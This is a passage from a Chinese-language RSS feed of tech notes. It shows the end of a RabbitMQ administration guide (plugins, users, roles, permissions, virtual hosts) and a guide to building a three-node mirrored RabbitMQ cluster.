<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit1 ~]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5>报错处理</h5>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">这里如果出现报错</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 可能是/var/lib/rabbitmq/.relang.cookie无权限</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">解决方案，chown或者chmod</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h4>关闭RabbitMQ</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmq-server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>RabbitMQ插件管理</h2>
<p>RabbitMQ通过插件系统提供了丰富的扩展性。常用的操作包括：</p>
<h3>添加插件</h3>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>rabbitmq-plugins enable {插件名}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>删除插件</h3>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>rabbitmq-plugins disable {插件名}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>开启浏览器控制面板</h3>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>rabbitmq-plugins enable rabbit_management</span></span>
<span class="line"><span></span></span>
<span class="line"><span>访问地址 http://YOUR_IP_ADDRESS:15672</span></span>
<span class="line"><span>但登录不进去，因为没用户</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>RabbitMQ用户和权限管理</h2>
<h3>添加用户</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add_user</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">usernam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt; &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">passwor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">d&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit1 ~]# rabbitmqctl add_user root root</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Creating</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "root"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>删除用户</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> delete_user</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">usernam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>更改密码</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> change_password</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">usernam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt; &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">new_passwor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">d&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>设置用户角色</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set_user_tags</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">usernam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt; &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">tag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">s&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit1 ~]# rabbitmqctl set_user_tags root administration</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Setting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tags</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "root"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [administration] ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>tag可以取的值: management monitoring policymarker administator</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>FROM : https://www.cnblogs.com/iiwen/p/5287790.html</span></span>
<span class="line"><span>RabbitMQ各类角色描述：</span></span>
<span class="line"><span>none</span></span>
<span class="line"><span>不能访问 management plugin</span></span>
<span class="line"><span></span></span>
<span class="line"><span>management</span></span>
<span class="line"><span>用户可以通过AMQP做的任何事外加：</span></span>
<span class="line"><span>列出自己可以通过AMQP登入的virtual hosts  </span></span>
<span class="line"><span>查看自己的virtual hosts中的queues, exchanges 和 bindings</span></span>
<span class="line"><span>查看和关闭自己的channels 和 connections</span></span>
<span class="line"><span>查看有关自己的virtual hosts的“全局”的统计信息，包含其他用户在这些virtual hosts中的活动。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>policymaker </span></span>
<span class="line"><span>management可以做的任何事外加：</span></span>
<span class="line"><span>查看、创建和删除自己的virtual hosts所属的policies和parameters</span></span>
<span class="line"><span></span></span>
<span class="line"><span>monitoring  </span></span>
<span class="line"><span>management可以做的任何事外加：</span></span>
<span class="line"><span>列出所有virtual hosts，包括他们不能登录的virtual hosts</span></span>
<span class="line"><span>查看其他用户的connections和channels</span></span>
<span class="line"><span>查看节点级别的数据如clustering和memory使用情况</span></span>
<span class="line"><span>查看真正的关于所有virtual hosts的全局的统计信息</span></span>
<span class="line"><span></span></span>
<span class="line"><span>administrator   </span></span>
<span class="line"><span>policymaker和monitoring可以做的任何事外加:</span></span>
<span class="line"><span>创建和删除virtual hosts</span></span>
<span class="line"><span>查看、创建和删除users</span></span>
<span class="line"><span>查看创建和删除permissions</span></span>
<span class="line"><span>关闭其他用户的connections</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>RabbitMQ权限管理</h2>
<h3>授权</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set_permissions</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-p &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">vhos</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">t&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">use</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">r&gt; &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">con</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f&gt; &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">writ</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt; &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">rea</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">d&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vhostpath</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 一个命名空间</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ，eg:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 表示根命名空间</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{user} 用户名</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{conf} 一个正则表达式match ，哪些资源能够被用户配置</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{write} 一个正则表达式match，哪些资源能够被用户读取</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{read} 一个正则表达式match，哪些资源能够被用户访问</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>查看权限</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list_permissions</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">vhos</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">t&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">查看根路径下的用户权限</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rebbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list_permissions</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">查看指定命名空间下的所有用户权限</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbirmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list_permissions</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /abc</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>查看指定用户的权限</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list_user_permissions</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {username}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>清空指定用户的权限</h3>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>rabbitmqctl clear_permissions &lt;username&gt;</span></span>
<span class="line"><span>[root@rabbit1 ~]#  rabbitmqctl clear_permissions  root</span></span>
<span class="line"><span>Clearing permissions for user "root" in vhost "/" ...</span></span>
<span class="line"><span>...done.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>虚拟主机（Virtual Hosts）</h2>
<p>虚拟主机类似于隔离的容器，可以用来组织和隔离不同的消息队列和交换器。</p>
<h3>添加虚拟主机</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add_vhost</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">vhost_nam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>删除虚拟主机</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> delete_vhost</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">vhost_nam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>RabbitMQ消息订阅和发送机制</h2>
<p>消费者订阅队列，生产者发送消息，然后发布到队列，最后将消息发送给消费者，


</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>RabbitMQ镜像集群搭建指南</title>
      <link>https://www.geekery.cn/note-book/RabbitMQ/RabbitMQ%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97.html</link>
      <guid>https://www.geekery.cn/note-book/RabbitMQ/RabbitMQ%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97.html</guid>
      <source url="https://www.geekery.cn/rss.xml">RabbitMQ镜像集群搭建指南</source>
      <description>RabbitMQ镜像集群搭建指南 概述 RabbitMQ是一个开源的消息代理和队列服务器，提供多种传输协议，如AMQP 0-9-1，MQTT，STOMP等。当需要构建高可用和高吞吐量的系统时，RabbitMQ的集群功能变得尤为重要。本文档将指导你如何在三台服务器上设置RabbitMQ镜像集群。 这种模式，才是所谓的 RabbitMQ 的高可用模式。跟普...</description>
      <pubDate>Tue, 23 Jul 2024 06:11:47 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>概述</h2>
<p>RabbitMQ是一个开源的消息代理和队列服务器，提供多种传输协议，如AMQP 0-9-1，MQTT，STOMP等。当需要构建高可用和高吞吐量的系统时，RabbitMQ的集群功能变得尤为重要。本文档将指导你如何在三台服务器上设置RabbitMQ镜像集群。</p>
<p>这种模式，才是所谓的 RabbitMQ 的高可用模式。跟普通集群模式不一样的是，在镜像集群模式下，你创建的 queue，无论元数据还是 queue 里的消息都会存在于多个实例上，就是说，每个 RabbitMQ 节点都有这个 queue 的一个完整镜像，包含 queue 的全部数据的意思。然后每次你写消息到 queue 的时候，都会自动把消息同步到多个实例的 queue 上。</p>
<h2>环境准备</h2>
<p>采用3节点rabbit1、rabbit2、rabbit3进行搭建。</p>
<p></p>
<h3>安装与配置</h3>
<p>确保在所有节点上已经安装了RabbitMQ，并且版本相同。</p>
<h2>步骤</h2>
<h3>创建管理员用户</h3>
<p>在每个节点上创建一个具有管理员权限的用户：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set_user_tags</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> administrator</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set_permissions</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ".*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ".*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ".*"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>分享Erlang Cookie</h3>
<p>为了保证节点之间的安全通信，你需要在所有节点上分享相同的Erlang Cookie。例如，在Node1上查看并复制Cookie：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后，使用<code>scp</code>命令将Cookie文件复制到其他节点：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">scp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit2:/var/lib/rabbitmq/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">scp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit3:/var/lib/rabbitmq/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>停止并重启RabbitMQ服务</h3>
<p>在进行集群配置前，确保停止RabbitMQ服务：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmq-server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后重新启动服务：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmq-server</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -detached</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>启动app</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># rabbitmqctl stop_app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start_app</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>配置集群</h3>
<p>在Node2和Node3上使用以下命令加入Node1的集群：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> join_cluster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>5. 验证集群状态</h3>
<p>在每个节点上使用以下命令检查集群状态：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cluster_status</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>预期输出如下所示：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit1 ~]# rabbitmqctl cluster_status</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Cluster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[{nodes,[{disc,[rabbit@rabbit1,rabbit@rabbit2,rabbit@rabbit3]}]},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {running_nodes,[rabbit@rabbit3,rabbit@rabbit2,rabbit@rabbit1]},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {cluster_name,</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&lt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"rabbit@rabbit1"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&gt;&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {partitions,[]}]</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span></code></pre>
